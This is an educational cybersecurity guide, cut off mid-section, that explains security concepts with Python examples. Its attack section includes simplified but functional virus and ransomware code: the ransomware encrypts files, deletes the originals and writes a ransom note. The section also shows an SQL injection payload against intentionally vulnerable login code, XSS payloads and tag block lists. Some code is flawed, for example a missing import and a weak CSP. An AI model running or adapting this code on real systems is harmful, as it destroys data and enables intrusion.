# Information & Cyber Security Concepts Guide - Part 1

*Comprehensive guide covering cybersecurity fundamentals from basics to advanced concepts*

## Table of Contents (Part 1)
1. [Introduction to Information Security](#introduction)
2. [CIA Triad - Confidentiality, Integrity, Availability](#cia-triad)
3. [Cyber Attacks and Threat Landscape](#cyber-attacks)
4. [Authentication and Access Control](#authentication)
5. [Network Security Fundamentals](#network-security)

---

## 1. Introduction to Information Security {#introduction}

### What is Information Security?

**Information Security**: The practice of protecting information by mitigating information risks through the application of security controls.

**Key Objectives**:
- **Protect** sensitive information from unauthorized access
- **Maintain** data integrity and authenticity
- **Ensure** availability of information systems
- **Comply** with regulatory requirements
- **Manage** security risks effectively

### Security Domains

**Physical Security**:
- Building access controls
- Environmental controls
- Hardware protection
- Disposal of sensitive materials

**Technical Security**:
- Network security controls
- System hardening
- Encryption technologies
- Access control systems

**Administrative Security**:
- Security policies and procedures
- Security awareness training
- Risk management
- Incident response planning

### Security Frameworks

**NIST Cybersecurity Framework**:
1. **Identify**: Asset management, risk assessment
2. **Protect**: Access control, data security
3. **Detect**: Security monitoring, detection processes
4. **Respond**: Incident response planning
5. **Recover**: Recovery planning, improvements

**ISO 27001/27002**:
- International standard for information security management
- Risk-based approach to security
- Continuous improvement model

**COBIT (Control Objectives for Information Technologies)**:
- IT governance framework
- Aligns IT with business objectives
- Risk management focus

---

## 2. CIA Triad - Confidentiality, Integrity, Availability {#cia-triad}

### Confidentiality

**Definition**: Ensuring information is accessible only to authorized individuals, entities, or processes.

**Threats to Confidentiality**:
- Unauthorized access to data
- Data breaches and leaks
- Social engineering attacks
- Insider threats
- Weak access controls

**Confidentiality Controls**:

**Encryption**:
```python
# Example: AES Encryption
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Encrypt data
plaintext = b"Confidential information"
ciphertext = cipher_suite.encrypt(plaintext)
print(f"Encrypted: {ciphertext}")

# Decrypt data
decrypted_text = cipher_suite.decrypt(ciphertext)
print(f"Decrypted: {decrypted_text}")
```

**Access Control Lists (ACLs)**:
```bash
# Linux file permissions example
chmod 600 sensitive_file.txt    # Owner read/write only
chmod 640 shared_file.txt       # Owner read/write, group read
chown user:group file.txt       # Change ownership
```

**Data Classification**:
- **Public**: No harm if disclosed
- **Internal**: Limited to organization
- **Confidential**: Significant harm if disclosed
- **Restricted**: Severe harm if disclosed

### Integrity

**Definition**: Maintaining accuracy and completeness of data over its entire lifecycle.

**Types of Integrity**:
- **Data Integrity**: Accuracy of data
- **System Integrity**: Proper system operation
- **Network Integrity**: Accurate data transmission

**Threats to Integrity**:
- Malware and viruses
- Unauthorized modifications
- System errors and failures
- Human errors
- Data corruption

**Integrity Controls**:

**Hash Functions**:
```python
import hashlib

# SHA-256 hash example
data = "Important document content"
hash_object = hashlib.sha256(data.encode())
hash_value = hash_object.hexdigest()
print(f"SHA-256 Hash: {hash_value}")

# Verify integrity
def verify_integrity(original_data, stored_hash):
    current_hash = hashlib.sha256(original_data.encode()).hexdigest()
    return current_hash == stored_hash

# Usage
is_intact = verify_integrity(data, hash_value)
print(f"Data integrity verified: {is_intact}")
```

**Digital Signatures**:
```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Sign data
message = b"Document to be signed"
signature = private_key.sign(
    message,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# Verify signature
try:
    public_key.verify(
        signature,
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("Signature verified successfully")
except:
    print("Signature verification failed")
```

**Version Control**:
- Track changes to documents and code
- Maintain audit trails
- Enable rollback capabilities

### Availability

**Definition**: Ensuring information and information systems are accessible when needed by authorized users.

**Threats to Availability**:
- Denial of Service (DoS) attacks
- Hardware failures
- Natural disasters
- Power outages
- Network failures

**Availability Controls**:

**Redundancy and Failover**:
```python
# Simple failover example
class DatabaseConnection:
    def __init__(self, primary_host, backup_hosts):
        self.primary_host = primary_host
        self.backup_hosts = backup_hosts
        self.current_connection = None
    
    def connect(self):
        # Try primary first
        try:
            self.current_connection = self._connect_to_host(self.primary_host)
            return self.current_connection
        except ConnectionError:
            print("Primary host failed, trying backups...")
            
            # Try backup hosts
            for backup_host in self.backup_hosts:
                try:
                    self.current_connection = self._connect_to_host(backup_host)
                    return self.current_connection
                except ConnectionError:
                    continue
            
            raise ConnectionError("All database hosts unavailable")
    
    def _connect_to_host(self, host):
        # Simulate connection logic
        if host == "failed_host":
            raise ConnectionError(f"Cannot connect to {host}")
        return f"Connected to {host}"

# Usage
db = DatabaseConnection("primary_db", ["backup1_db", "backup2_db"])
connection = db.connect()
print(connection)
```

**Backup and Recovery**:
```bash
# Automated backup script example
#!/bin/bash
BACKUP_DIR="/backup/$(date +%Y%m%d)"
SOURCE_DIR="/data"

# Create backup directory
mkdir -p $BACKUP_DIR

# Full backup
tar -czf $BACKUP_DIR/full_backup.tar.gz $SOURCE_DIR

# Incremental backup (files modified in last 24 hours)
find $SOURCE_DIR -mtime -1 -type f | tar -czf $BACKUP_DIR/incremental_backup.tar.gz -T -

# Verify backup integrity
tar -tzf $BACKUP_DIR/full_backup.tar.gz > /dev/null && echo "Backup verified"

# Retention policy (keep 30 days)
find /backup -type d -mtime +30 -exec rm -rf {} \;
```

**Load Balancing**:
```python
import random

class LoadBalancer:
    def __init__(self, servers):
        self.servers = servers
        self.current_index = 0
    
    def round_robin(self):
        """Round-robin load balancing"""
        server = self.servers[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.servers)
        return server
    
    def random_selection(self):
        """Random server selection"""
        return random.choice(self.servers)
    
    def weighted_selection(self, weights):
        """Weighted random selection"""
        return random.choices(self.servers, weights=weights)[0]

# Usage
servers = ["server1", "server2", "server3"]
lb = LoadBalancer(servers)

# Distribute 10 requests
for i in range(10):
    server = lb.round_robin()
    print(f"Request {i+1} -> {server}")
```

---

## 3. Cyber Attacks and Threat Landscape {#cyber-attacks}

### Attack Classifications

**By Intent**:
- **Targeted**: Specific organization or individual
- **Opportunistic**: Broad attacks seeking vulnerabilities
- **Insider**: Attacks from within the organization

**By Method**:
- **Technical**: Exploiting system vulnerabilities
- **Social**: Manipulating human behavior
- **Physical**: Direct access to systems

### Common Cyber Attacks

**Malware Attacks**:

**Virus**:
```python
# Virus behavior simulation (for educational purposes)
import os
import shutil

class VirusSimulation:
    def __init__(self):
        self.signature = "VIRUS_SIGNATURE_2024"
    
    def infect_file(self, file_path):
        """Simulate virus infection (DO NOT USE MALICIOUSLY)"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            
            if self.signature not in content:
                with open(file_path, 'w') as f:
                    f.write(f"#{self.signature}\n{content}")
                print(f"File {file_path} infected")
        except:
            pass
    
    def replicate(self, directory):
        """Simulate replication"""
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.txt'):
                    self.infect_file(os.path.join(root, file))

# Antivirus detection
class AntivirusScanner:
    def __init__(self):
        self.virus_signatures = ["VIRUS_SIGNATURE_2024", "MALWARE_PATTERN"]
    
    def scan_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            
            for signature in self.virus_signatures:
                if signature in content:
                    return f"THREAT DETECTED: {signature} in {file_path}"
            
            return f"File {file_path} is clean"
        except:
            return f"Cannot scan {file_path}"

# Usage
av = AntivirusScanner()
result = av.scan_file("test_file.txt")
print(result)
```

**Ransomware**:
```python
# Ransomware behavior simulation (EDUCATIONAL ONLY)
import os
from cryptography.fernet import Fernet

class RansomwareSimulation:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
    
    def encrypt_file(self, file_path):
        """Simulate file encryption"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted_data = self.cipher.encrypt(data)
            
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(encrypted_data)
            
            os.remove(file_path)
            self.encrypted_files.append(file_path)
            print(f"File {file_path} encrypted")
        except:
            pass
    
    def create_ransom_note(self, directory):
        """Create ransom note"""
        note = """
        YOUR FILES HAVE BEEN ENCRYPTED!
        
        To recover your files, you must pay the ransom.
        Contact: attacker@evil.com
        
        DO NOT attempt to decrypt files yourself!
        """
        
        with open(os.path.join(directory, "RANSOM_NOTE.txt"), 'w') as f:
            f.write(note)

# Ransomware protection
class RansomwareProtection:
    def __init__(self):
        self.monitored_extensions = ['.doc', '.pdf', '.jpg', '.txt']
        self.backup_directory = "/secure_backup/"
    
    def create_backup(self, file_path):
        """Create secure backup"""
        backup_path = os.path.join(self.backup_directory, os.path.basename(file_path))
        shutil.copy2(file_path, backup_path)
        print(f"Backup created: {backup_path}")
    
    def detect_encryption_activity(self, directory):
        """Monitor for suspicious encryption activity"""
        encrypted_count = 0
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    encrypted_count += 1
        
        if encrypted_count > 5:  # Threshold
            return "RANSOMWARE ACTIVITY DETECTED!"
        return "No suspicious activity"
```

**Phishing Attacks**:
```python
import re
import requests
from urllib.parse import urlparse

class PhishingDetector:
    def __init__(self):
        self.suspicious_domains = [
            'bit.ly', 'tinyurl.com', 'goo.gl',  # URL shorteners
            'secure-bank-login.com',  # Suspicious banking
            'paypal-verification.net'  # Fake PayPal
        ]
        
        self.phishing_keywords = [
            'urgent', 'verify account', 'suspended',
            'click here now', 'limited time', 'act now'
        ]
    
    def analyze_email(self, email_content, sender_email, links):
        """Analyze email for phishing indicators"""
        risk_score = 0
        warnings = []
        
        # Check sender domain
        sender_domain = sender_email.split('@')[1]
        if sender_domain in self.suspicious_domains:
            risk_score += 30
            warnings.append(f"Suspicious sender domain: {sender_domain}")
        
        # Check for phishing keywords
        content_lower = email_content.lower()
        for keyword in self.phishing_keywords:
            if keyword in content_lower:
                risk_score += 10
                warnings.append(f"Suspicious keyword found: {keyword}")
        
        # Check links
        for link in links:
            domain = urlparse(link).netloc
            if domain in self.suspicious_domains:
                risk_score += 25
                warnings.append(f"Suspicious link domain: {domain}")
            
            # Check for URL shorteners
            if any(shortener in domain for shortener in ['bit.ly', 'tinyurl', 'goo.gl']):
                risk_score += 15
                warnings.append(f"URL shortener detected: {domain}")
        
        # Determine risk level
        if risk_score >= 50:
            risk_level = "HIGH"
        elif risk_score >= 25:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        return {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'warnings': warnings
        }
    
    def check_url_reputation(self, url):
        """Check URL against threat intelligence"""
        # Simulate threat intelligence check
        malicious_patterns = [
            r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}',  # IP addresses
            r'[a-z0-9]{20,}\.com',  # Long random domains
        ]
        
        for pattern in malicious_patterns:
            if re.search(pattern, url):
                return "MALICIOUS"
        
        return "CLEAN"

# Usage
detector = PhishingDetector()
email_content = "URGENT: Your account will be suspended! Click here now to verify."
sender = "security@paypal-verification.net"
links = ["http://paypal-verification.net/login", "http://bit.ly/urgent-verify"]

result = detector.analyze_email(email_content, sender, links)
print(f"Risk Level: {result['risk_level']}")
print(f"Risk Score: {result['risk_score']}")
for warning in result['warnings']:
    print(f"Warning: {warning}")
```

**SQL Injection**:
```python
import sqlite3

# Vulnerable code example
class VulnerableDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(':memory:')
        self.setup_database()
    
    def setup_database(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                email TEXT
            )
        ''')
        
        cursor.execute('''
            INSERT INTO users (username, password, email) VALUES
            ('admin', 'admin123', 'admin@company.com'),
            ('user1', 'password1', 'user1@company.com'),
            ('user2', 'password2', 'user2@company.com')
        ''')
        self.conn.commit()
    
    def vulnerable_login(self, username, password):
        """VULNERABLE: Direct string concatenation"""
        cursor = self.conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"Executing query: {query}")
        
        cursor.execute(query)
        return cursor.fetchone()
    
    def secure_login(self, username, password):
        """SECURE: Using parameterized queries"""
        cursor = self.conn.cursor()
        query = "SELECT * FROM users WHERE username = ? AND password = ?"
        cursor.execute(query, (username, password))
        return cursor.fetchone()

# SQL Injection demonstration
db = VulnerableDatabase()

# Normal login
print("Normal login:")
result = db.vulnerable_login("admin", "admin123")
print(f"Result: {result}")

# SQL Injection attack
print("\nSQL Injection attack:")
malicious_input = "admin' OR '1'='1' --"
result = db.vulnerable_login(malicious_input, "anything")
print(f"Result: {result}")

# Secure version
print("\nSecure login with same input:")
result = db.secure_login(malicious_input, "anything")
print(f"Result: {result}")
```

**Cross-Site Scripting (XSS)**:
```python
import html
import re

class XSSProtection:
    def __init__(self):
        self.dangerous_tags = [
            'script', 'iframe', 'object', 'embed',
            'form', 'input', 'textarea', 'button'
        ]
        
        self.dangerous_attributes = [
            'onclick', 'onload', 'onerror', 'onmouseover',
            'javascript:', 'vbscript:', 'data:'
        ]
    
    def sanitize_input(self, user_input):
        """Sanitize user input to prevent XSS"""
        # HTML encode special characters
        sanitized = html.escape(user_input)
        
        # Remove dangerous tags
        for tag in self.dangerous_tags:
            pattern = f'<{tag}[^>]*>.*?</{tag}>'
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE | re.DOTALL)
            
            # Remove self-closing tags
            pattern = f'<{tag}[^>]*/?>'
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        # Remove dangerous attributes
        for attr in self.dangerous_attributes:
            pattern = f'{attr}[^>]*'
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        return sanitized
    
    def validate_url(self, url):
        """Validate URL to prevent XSS through links"""
        dangerous_protocols = ['javascript:', 'vbscript:', 'data:']
        
        url_lower = url.lower().strip()
        for protocol in dangerous_protocols:
            if url_lower.startswith(protocol):
                return False
        
        return True
    
    def content_security_policy(self):
        """Generate Content Security Policy header"""
        csp = {
            'default-src': "'self'",
            'script-src': "'self' 'unsafe-inline'",
            'style-src': "'self' 'unsafe-inline'",
            'img-src': "'self' data: https:",
            'connect-src': "'self'",
            'font-src': "'self'",
            'object-src': "'none'",
            'media-src': "'self'",
            'frame-src': "'none'"
        }
        
        csp_string = '; '.join([f"{key} {value}" for key, value in csp.items()])
        return f"Content-Security-Policy: {csp_string}"

# Usage
xss_protection = XSSProtection()

# Test malicious inputs
malicious_inputs = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "javascript:alert('XSS')"
]

for malicious_input in malicious_inputs:
    sanitized = xss_protection.sanitize_input(malicious_input)
    print(f"Original: {malicious_input}")
    print(f"Sanitized: {sanitized}")
    print("---")

# CSP header
print(xss_protection.content_security_policy())
```

### Advanced Persistent Threats (APT)

**APT Characteristics**:
- Long-term presence in networks
- Sophisticated attack techniques
- Specific targets and objectives
- Multiple attack vectors
- Evasion of detection systems

**APT Attack Lifecycle**:
1. **Initial Compromise**: Spear phishing, watering hole attacks
2. **Establish Foothold**: Install backdoors, create persistence
3. **Escalate Privileges**: Exploit vulnerabilities, credential theft
4. **Internal Reconnaissance**: Network mapping, asset discovery
5. **Move Laterally**: Spread through network, compromise additional systems
6. **Maintain Presence**: Update tools, establish multiple access points
7. **Complete Mission**: Data exfiltration, system disruption

**APT Detection**:
```python
import datetime
import json

class APTDetector:
    def __init__(self):
        self.indicators = {
            'network_anomalies': [],
            'file_anomalies': [],
            'process_anomalies': [],
            'user_anomalies': []
        }
        
        self.threat_score = 0
        self.alert_threshold = 75
    
    def analyze_network_traffic(self, connections):
        """Analyze network connections for APT indicators"""
        suspicious_patterns = []
        
        for conn in connections:
            # Check for unusual outbound connections
            if conn['direction'] == 'outbound' and conn['port'] not in [80, 443, 53]:
                suspicious_patterns.append(f"Unusual outbound connection to {conn['destination']}:{conn['port']}")
                self.threat_score += 10
            
            # Check for data exfiltration patterns
            if conn['bytes_out'] > 1000000:  # Large data transfer
                suspicious_patterns.append(f"Large data transfer: {conn['bytes_out']} bytes to {conn['destination']}")
                self.threat_score += 15
            
            # Check for command and control patterns
            if conn['frequency'] == 'regular' and conn['small_packets']:
                suspicious_patterns.append(f"Potential C2 communication with {conn['destination']}")
                self.threat_score += 20
        
        self.indicators['network_anomalies'] = suspicious_patterns
        return suspicious_patterns
    
    def analyze_file_activity(self, file_events):
        """Analyze file system activity"""
        suspicious_files = []
        
        for event in file_events:
            # Check for suspicious file locations
            if any(path in event['path'] for path in ['/tmp/', 'C:\\Temp\\', '%APPDATA%']):
                suspicious_files.append(f"File activity in suspicious location: {event['path']}")
                self.threat_score += 10
            
            # Check for executable files in unusual locations
            if event['type'] == 'created' and event['path'].endswith('.exe') and 'System32' not in event['path']:
                suspicious_files.append(f"Executable created in unusual location: {event['path']}")
                self.threat_score += 15
            
            # Check for file encryption activity
            if event['type'] == 'modified' and event['path'].endswith('.encrypted'):
                suspicious_files.append(f"File encryption detected: {event['path']}")
                self.threat_score += 25
        
        self.indicators['file_anomalies'] = suspicious_files
        return suspicious_files
    
    def analyze_process_activity(self, processes):
        """Analyze running processes"""
        suspicious_processes = []
        
        for process in processes:
            # Check for processes with no parent
            if process['parent_pid'] == 0 and process['name'] not in ['init', 'kernel']:
                suspicious_processes.append(f"Orphaned process: {process['name']}")
                self.threat_score += 15
            
            # Check for processes running from unusual locations
            if any(path in process['path'] for path in ['/tmp/', 'C:\\Temp\\']):
                suspicious_processes.append(f"Process running from suspicious location: {process['path']}")
                self.threat_score += 20
            
            # Check for memory injection indicators
            if process['memory_anomaly']:
                suspicious_processes.append(f"Memory anomaly in process: {process['name']}")
                self.threat_score += 25
        
        self.indicators['process_anomalies'] = suspicious_processes
        return suspicious_processes
    
    def generate_report(self):
        """Generate APT detection report"""
        report = {
            'timestamp': datetime.datetime.now().isoformat(),
            'threat_score': self.threat_score,
            'risk_level': self.get_risk_level(),
            'indicators': self.indicators,
            'recommendations': self.get_recommendations()
        }
        
        return json.dumps(report, indent=2)
    
    def get_risk_level(self):
        if self.threat_score >= 75:
            return "CRITICAL"
        elif self.threat_score >= 50:
            return "HIGH"
        elif self.threat_score >= 25:
            return "MEDIUM"
        else:
            return "LOW"
    
    def get_recommendations(self):
        recommendations = []
        
        if self.threat_score >= 75:
            recommendations.extend([
                "Immediately isolate affected systems",
                "Activate incident response team",
                "Preserve forensic evidence",
                "Contact law enforcement if required"
            ])
        elif self.threat_score >= 50:
            recommendations.extend([
                "Increase monitoring on affected systems",
                "Review and update security controls",
                "Conduct threat hunting activities"
            ])
        else:
            recommendations.extend([
                "Continue monitoring",
                "Review security logs regularly"
            ])
        
        return recommendations

# Usage example
apt_detector = APTDetector()

# Simulate network connections
network_connections = [
    {'direction': 'outbound', 'destination': '192.168.1.100', 'port': 8080, 'bytes_out': 50000, 'frequency': 'regular', 'small_packets': True},
    {'direction': 'outbound', 'destination': 'malicious-c2.com', 'port': 443, 'bytes_out': 2000000, 'frequency': 'regular', 'small_packets': False}
]

# Simulate file events
file_events = [
    {'type': 'created', 'path': '/tmp/backdoor.exe'},
    {'type': 'modified', 'path': '/home/user/document.txt.encrypted'}
]

# Simulate processes
processes = [
    {'name': 'suspicious_process', 'parent_pid': 0, 'path': '/tmp/malware', 'memory_anomaly': True},
    {'name': 'normal_process', 'parent_pid': 1234, 'path': '/usr/bin/normal', 'memory_anomaly': False}
]

# Analyze
apt_detector.analyze_network_traffic(network_connections)
apt_detector.analyze_file_activity(file_events)
apt_detector.analyze_process_activity(processes)

# Generate report
report = apt_detector.generate_report()
print(report)
```

---

## 4. Authentication and Access Control {#authentication}

### Authentication Factors

**Something You Know (Knowledge)**:
- Passwords
- PINs
- Security questions
- Passphrases

**Something You Have (Possession)**:
- Smart cards
- Tokens
- Mobile devices
- Certificates

**Something You Are (Inherence)**:
- Fingerprints
- Retina scans
- Voice recognition
- Facial recognition

### Multi-Factor Authentication (MFA)

**Implementation Example**:
```python
import random
import hashlib
import time
import pyotp
import qrcode
from io import BytesIO

class MFASystem:
    def __init__(self):
        self.users = {}
        self.failed_attempts = {}
        self.lockout_threshold = 3
        self.lockout_duration = 300  # 5 minutes
    
    def register_user(self, username, password, phone_number=None):
        """Register a new user with MFA"""
        # Hash password
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        # Generate TOTP secret
        totp_secret = pyotp.random_base32()
        
        self.users[username] = {
            'password_hash': password_hash,
            'phone_number': phone_number,
            'totp_secret': totp_secret,
            'backup_codes': self.generate_backup_codes(),
            'is_locked': False,
            'lock_time': None
        }
        
        return totp_secret
    
    def generate_backup_codes(self, count=10):
        """Generate backup codes for account recovery"""
        codes = []
        for _ in range(count):
            code = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            codes.append(code)
        return codes
    
    def authenticate_password(self, username, password):
        """First factor: password authentication"""
        if username not in self.users:
            return False
        
        # Check if account is locked
        if self.is_account_locked(username):
            return False
        
        user = self.users[username]
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        if user['password_hash'] == password_hash:
            # Reset failed attempts on successful authentication
            self.failed_attempts[username] = 0
            return True
        else:
            # Increment failed attempts
            self.failed_attempts[username] = self.failed_attempts.get(username, 0) + 1
            
            # Lock account if threshold exceeded
            if self.failed_attempts[username] >= self.lockout_threshold:
                self.users[username]['is_locked'] = True
                self.users[username]['lock_time'] = time.time()
            
            return False
    
    def authenticate_totp(self, username, totp_code):
        """Second factor: TOTP authentication"""
        if username not in self.users:
            return False
        
        user = self.users[username]
        totp = pyotp.TOTP(user['totp_secret'])
        
        return totp.verify(totp_code, valid_window=1)
    
    def authenticate_sms(self, username, sms_code):
        """Second factor: SMS authentication"""
        # In real implementation, this would verify against sent SMS code
        # For demo, we'll simulate with a simple check
        return len(sms_code) == 6 and sms_code.isdigit()
    
    def authenticate_backup_code(self, username, backup_code):
        """Backup authentication method"""
        if username not in self.users:
            return False
        
        user = self.users[username]
        if backup_code in user['backup_codes']:
            # Remove used backup code
            user['backup_codes'].remove(backup_code)
            return True
        
        return False
    
    def is_account_locked(self, username):
        """Check if account is locked"""
        if username not in self.users:
            return False
        
        user = self.users[username]
        if not user['is_locked']:
            return False
        
        # Check if lockout period has expired
        if time.time() - user['lock_time'] > self.lockout_duration:
            user['is_locked'] = False
            user['lock_time'] = None
            self.failed_attempts[username] = 0
            return False
        
        return True
    
    def generate_qr_code(self, username):
        """Generate QR code for TOTP setup"""
        if username not in self.users:
            return None
        
        user = self.users[username]
        totp_uri = pyotp.totp.TOTP(user['totp_secret']).provisioning_uri(
            name=username,
            issuer_name="SecureApp"
        )
        
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(totp_uri)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        return img
    
    def full_authentication(self, username, password, second_factor_code, second_factor_type='totp'):
        """Complete MFA authentication process"""
        # First factor: password
        if not self.authenticate_password(username, password):
            return {'success': False, 'message': 'Invalid password or account locked'}
        
        # Second factor
        if second_factor_type == 'totp':
            if not self.authenticate_totp(username, second_factor_code):
                return {'success': False, 'message': 'Invalid TOTP code'}
        elif second_factor_type == 'sms':
            if not self.authenticate_sms(username, second_factor_code):
                return {'success': False, 'message': 'Invalid SMS code'}
        elif second_factor_type == 'backup':
            if not self.authenticate_backup_code(username, second_factor_code):
                return {'success': False, 'message': 'Invalid backup code'}
        else:
            return {'success': False, 'message': 'Invalid second factor type'}
        
        return {'success': True, 'message': 'Authentication successful'}

# Usage example
mfa_system = MFASystem()

# Register user
totp_secret = mfa_system.register_user("john_doe", "SecurePassword123!", "+1234567890")
print(f"TOTP Secret for setup: {totp_secret}")

# Generate current TOTP code for testing
totp = pyotp.TOTP(totp_secret)
current_code = totp.now()
print(f"Current TOTP code: {current_code}")

# Authenticate
result = mfa_system.full_authentication("john_doe", "SecurePassword123!", current_code, "totp")
print(f"Authentication result: {result}")
```

### Access Control Models

**Discretionary Access Control (DAC)**:
```python
class DACSystem:
    def __init__(self):
        self.resources = {}
        self.users = set()
    
    def create_resource(self, resource_name, owner):
        """Create a resource with owner having full control"""
        self.resources[resource_name] = {
            'owner': owner,
            'permissions': {
                owner: ['read', 'write', 'execute', 'delete', 'change_permissions']
            }
        }
        self.users.add(owner)
    
    def grant_permission(self, resource_name, grantor, grantee, permissions):
        """Grant permissions to a user (only owner or authorized users can grant)"""
        if resource_name not in self.resources:
            return False
        
        resource = self.resources[resource_name]
        
        # Check if grantor has permission to grant
        if grantor != resource['owner'] and 'change_permissions' not in resource['permissions'].get(grantor, []):
            return False
        
        if grantee not in resource['permissions']:
            resource['permissions'][grantee] = []
        
        for permission in permissions:
            if permission not in resource['permissions'][grantee]:
                resource['permissions'][grantee].append(permission)
        
        self.users.add(grantee)
        return True
    
    def revoke_permission(self, resource_name, revoker, user, permissions):
        """Revoke permissions from a user"""
        if resource_name not in self.resources:
            return False
        
        resource = self.resources[resource_name]
        
        # Check if revoker has permission to revoke
        if revoker != resource['owner'] and 'change_permissions' not in resource['permissions'].get(revoker, []):
            return False
        
        if user in resource['permissions']:
            for permission in permissions:
                if permission in resource['permissions'][user]:
                    resource['permissions'][user].remove(permission)
        
        return True
    
    def check_permission(self, resource_name, user, permission):
        """Check if user has specific permission on resource"""
        if resource_name not in self.resources:
            return False
        
        resource = self.resources[resource_name]
        user_permissions = resource['permissions'].get(user, [])
        
        return permission in user_permissions
    
    def access_resource(self, resource_name, user, action):
        """Attempt to access resource with specific action"""
        permission_map = {
            'read': 'read',
            'write': 'write',
            'execute': 'execute',
            'delete': 'delete'
        }
        
        required_permission = permission_map.get(action)
        if not required_permission:
            return False
        
        return self.check_permission(resource_name, user, required_permission)

# Usage
dac = DACSystem()
dac.create_resource("confidential_document.txt", "alice")
dac.grant_permission("confidential_document.txt", "alice", "bob", ["read"])
dac.grant_permission("confidential_document.txt", "alice", "charlie", ["read", "write"])

# Test access
print(f"Bob can read: {dac.access_resource('confidential_document.txt', 'bob', 'read')}")
print(f"Bob can write: {dac.access_resource('confidential_document.txt', 'bob', 'write')}")
print(f"Charlie can write: {dac.access_resource('confidential_document.txt', 'charlie', 'write')}")
```

**Role-Based Access Control (RBAC)**:
```python
class RBACSystem:
    def __init__(self):
        self.users = {}
        self.roles = {}
        self.permissions = set()
        self.resources = {}
    
    def create_permission(self, permission_name):
        """Create a new permission"""
        self.permissions.add(permission_name)
    
    def create_role(self, role_name, permissions=None):
        """Create a new role with optional permissions"""
        self.roles[role_name] = {
            'permissions': set(permissions) if permissions else set(),
            'users': set()
        }
    
    def add_permission_to_role(self, role_name, permission):
        """Add permission to role"""
        if role_name in self.roles and permission in self.permissions:
            self.roles[role_name]['permissions'].add(permission)
            return True
        return False
    
    def remove_permission_from_role(self, role_name, permission):
        """Remove permission from role"""
        if role_name in self.roles:
            self.roles[role_name]['permissions'].discard(permission)
            return True
        return False
    
    def create_user(self, username):
        """Create a new user"""
        self.users[username] = {
            'roles': set(),
            'active': True
        }
    
    def assign_role_to_user(self, username, role_name):
        """Assign role to user"""
        if username in self.users and role_name in self.roles:
            self.users[username]['roles'].add(role_name)
            self.roles[role_name]['users'].add(username)
            return True
        return False
    
    def revoke_role_from_user(self, username, role_name):
        """Revoke role from user"""
        if username in self.users and role_name in self.roles:
            self.users[username]['roles'].discard(role_name)
            self.roles[role_name]['users'].discard(username)
            return True
        return False
    
    def get_user_permissions(self, username):
        """Get all permissions for a user through their roles"""
        if username not in self.users:
            return set()
        
        user_permissions = set()
        for role_name in self.users[username]['roles']:
            if role_name in self.roles:
                user_permissions.update(self.roles[role_name]['permissions'])
        
        return user_permissions
    
    def check_permission(self, username, permission):
        """Check if user has specific permission"""
        if not self.users.get(username, {}).get('active', False):
            return False
        
        user_permissions = self.get_user_permissions(username)
        return permission in user_permissions
    
    def create_resource(self, resource_name, required_permissions):
        """Create a resource with required permissions"""
        self.resources[resource_name] = {
            'required_permissions': set(required_permissions)
        }
    
    def access_resource(self, username, resource_name):
        """Check if user can access resource"""
        if resource_name not in self.resources:
            return False
        
        required_permissions = self.resources[resource_name]['required_permissions']
        user_permissions = self.get_user_permissions(username)
        
        # User must have all required permissions
        return required_permissions.issubset(user_permissions)

# Usage example
rbac = RBACSystem()

# Create permissions
permissions = ['read_files', 'write_files', 'delete_files', 'manage_users', 'system_admin']
for perm in permissions:
    rbac.create_permission(perm)

# Create roles
rbac.create_role('viewer', ['read_files'])
rbac.create_role('editor', ['read_files', 'write_files'])
rbac.create_role('admin', ['read_files', 'write_files', 'delete_files', 'manage_users'])
rbac.create_role('super_admin', permissions)

# Create users
rbac.create_user('alice')
rbac.create_user('bob')
rbac.create_user('charlie')

# Assign roles
rbac.assign_role_to_user('alice', 'admin')
rbac.assign_role_to_user('bob', 'editor')
rbac.assign_role_to_user('charlie', 'viewer')

# Create resources
rbac.create_resource('sensitive_document', ['read_files', 'manage_users'])
rbac.create_resource('public_document', ['read_files'])

# Test access
print(f"Alice can access sensitive document: {rbac.access_resource('alice', 'sensitive_document')}")
print(f"Bob can access sensitive document: {rbac.access_resource('bob', 'sensitive_document')}")
print(f"Charlie can access public document: {rbac.access_resource('charlie', 'public_document')}")
```

---

## 5. Network Security Fundamentals {#network-security}

### Network Security Architecture

**Defense in Depth**:
- Multiple layers of security controls
- Redundant security measures
- Fail-safe mechanisms

**Network Segmentation**:
```python
class NetworkSegmentation:
    def __init__(self):
